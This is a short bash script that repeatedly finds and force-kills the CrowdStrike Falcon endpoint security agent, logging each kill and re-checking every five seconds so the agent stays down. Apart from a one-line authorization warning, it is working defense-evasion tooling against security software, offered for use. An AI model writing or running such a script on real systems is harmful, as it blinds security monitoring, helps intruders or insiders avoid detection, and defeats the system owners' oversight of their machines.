#!/bin/bash

# Script to monitor and kill CrowdStrike Falcon Agent
# WARNING: Only use this if you have proper authorization

PROCESS_NAME="com.crowdstrike.falcon.Agent"
LOG_FILE="$HOME/falcon_killer.log"

log_message() {
    echo "$(date): $1" >> "$LOG_FILE"
}

kill_falcon() {
    # Find all processes matching the Falcon Agent
    PIDS=$(pgrep -f "$PROCESS_NAME")
    
    if [ -n "$PIDS" ]; then
        log_message "Found Falcon Agent processes: $PIDS"
        echo $PIDS | xargs kill -9
        log_message "Killed Falcon Agent processes"
        echo "Killed Falcon Agent processes at $(date)"
    fi
}

# Initial kill
kill_falcon

# Monitor and kill continuously
while true; do
    sleep 5  # Check every 5 seconds
    
    if pgrep -f "$PROCESS_NAME" > /dev/null; then
        kill_falcon
    fi
done
